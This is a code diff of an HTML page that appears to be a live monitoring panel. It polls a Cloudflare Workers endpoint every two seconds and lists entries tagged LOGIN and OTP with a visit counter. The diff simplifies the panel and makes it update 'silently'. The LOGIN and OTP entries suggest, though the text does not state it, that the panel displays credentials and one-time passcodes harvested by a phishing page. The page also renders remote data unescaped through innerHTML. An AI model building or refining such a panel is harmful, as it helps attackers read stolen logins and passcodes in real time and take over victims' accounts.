@@ -3,148 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Live Admin Control</title>
+    <title>Smart Dashboard</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
-        body { background-color: #f4f7f6; padding-bottom: 60px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #f8f9fa; color: #333; }
 
-        /* Top Header - Yahan Count Badhega */
+        /* Fixed Header */
         .header {
             background: #315195;
             color: white;
-            padding: 20px;
+            padding: 15px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             position: sticky;
             top: 0;
             z-index: 1000;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        .header h1 { font-size: 18px; font-weight: 700; letter-spacing: 0.5px; }
+        .header h1 { font-size: 16px; font-weight: 600; }
         
-        /* Highlighting the Visit Count */
-        .visit-counter {
+        .v-badge {
             background: #ff9800;
-            color: #fff;
-            padding: 5px 15px;
-            border-radius: 25px;
+            padding: 4px 15px;
+            border-radius: 20px;
+            font-weight: 800;
             font-size: 18px;
-            font-weight: 900;
-            box-shadow: 0 0 10px rgba(255,152,0,0.5);
-            min-width: 50px;
-            text-align: center;
         }
 
-        .container { padding: 12px; display: flex; flex-direction: column; gap: 12px; }
+        .container { padding: 10px; display: flex; flex-direction: column; gap: 8px; }
 
-        /* Vertical Colourful Cards */
-        .card {
-            background: #ffffff;
-            border-radius: 12px;
-            padding: 16px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
-            border-left: 6px solid #315195;
-            animation: slideIn 0.3s ease-out;
-        }
-
-        @keyframes slideIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
-
-        .card-login { border-left-color: #28a745; background: #f1fff4; }
-        .card-otp { border-left-color: #ff9800; background: #fffcf0; }
-        .card-visit { border-left-color: #315195; background: #f0f4ff; }
-
-        .card-top { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #f0f0f0; padding-bottom: 6px; }
-        .tag { font-size: 11px; font-weight: 800; text-transform: uppercase; color: #444; }
-        .time { font-size: 10px; color: #aaa; }
-
-        /* Detail Formatting (Alag Alag Line) */
-        .detail-view {
+        /* Clean Data Row */
+        .data-row {
+            background: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            border-left: 5px solid #315195;
             font-size: 16px;
-            color: #111;
             font-weight: 700;
-            line-height: 1.8;
-            white-space: pre-wrap; /* Line break ke liye */
+            line-height: 1.5;
+            white-space: pre-wrap;
             word-break: break-all;
         }
 
-        /* Bottom Status */
-        .footer-status {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            background: #fff;
-            padding: 10px;
-            text-align: center;
-            font-size: 11px;
-            color: #666;
-            border-top: 1px solid #eee;
-        }
-        .dot { height: 8px; width: 8px; background: #28a745; border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }
+        .card-login { border-left-color: #28a745; }
+        .card-otp { border-left-color: #ff9800; }
+
+        /* Live Smooth Indicator */
+        .sync-text { text-align: center; font-size: 10px; color: #bbb; margin-top: 15px; }
     </style>
 </head>
 <body>
 
     <div class="header">
         <h1>LIVE ACTIVITY</h1>
-        <div class="visit-counter" id="vCount">0</div>
+        <div class="v-badge" id="vCount">0</div>
     </div>
 
     <div class="container" id="logsDisplay">
         </div>
 
-    <div class="footer-status">
-        <span class="dot"></span> Real-time Syncing (Every 2s)
-    </div>
+    <div class="sync-text">Updating data silently...</div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
+        let lastDataHash = ""; 
 
-        async function updateDashboard() {
+        async function updateData() {
             try {
                 const res = await fetch(workerURL);
-                const logs = await res.json();
+                const data = await res.json();
                 
                 const display = document.getElementById('logsDisplay');
-                const vBadge = document.getElementById('vCount');
+                const badge = document.getElementById('vCount');
 
-                if (!logs || logs.length === 0) {
-                    display.innerHTML = "<p style='text-align:center; padding-top:50px; color:#999;'>No logs yet...</p>";
-                    vBadge.innerText = "0";
+                // JSON string check taaki blink na ho agar data same hai
+                const currentHash = JSON.stringify(data);
+                if (currentHash === lastDataHash) return; 
+                lastDataHash = currentHash;
+
+                if (!data || data.length === 0) {
+                    display.innerHTML = "";
+                    badge.innerText = "0";
                     return;
                 }
 
-                // 1. VISIT COUNT (Total rows)
-                vBadge.innerText = logs.length;
+                // Update Counter
+                badge.innerText = data.length;
 
-                // 2. RENDER LOGS (Newest on Top)
-                display.innerHTML = logs.map(log => {
-                    let cardClass = "card-visit";
-                    const type = String(log.type).toUpperCase();
-                    
-                    if(type.includes("LOGIN")) cardClass = "card-login";
-                    if(type.includes("OTP")) cardClass = "card-otp";
+                // Render Only Data (No Time, No Extra Text)
+                display.innerHTML = data.map(log => {
+                    let typeClass = "";
+                    if(String(log.type).includes("LOGIN")) typeClass = "card-login";
+                    if(String(log.type).includes("OTP")) typeClass = "card-otp";
 
                     return `
-                        <div class="card ${cardClass}">
-                            <div class="card-top">
-                                <span class="tag">${log.type}</span>
-                                <span class="time">${log.time}</span>
-                            </div>
-                            <div class="detail-view">${log.detail}</div>
-                        </div>
+                        <div class="data-row ${typeClass}">${log.detail}</div>
                     `;
                 }).join('');
 
             } catch (e) {
-                console.log("Updating...");
+                console.log("Silent update failed");
             }
         }
 
-        // Fast Refresh: Har 2 second mein check karega
-        setInterval(updateDashboard, 2000);
-        window.onload = updateDashboard;
+        // Fast Refresh (2 seconds) bina kisi blink ke
+        setInterval(updateData, 2000);
+        window.onload = updateData;
     </script>
 </body>
 </html>
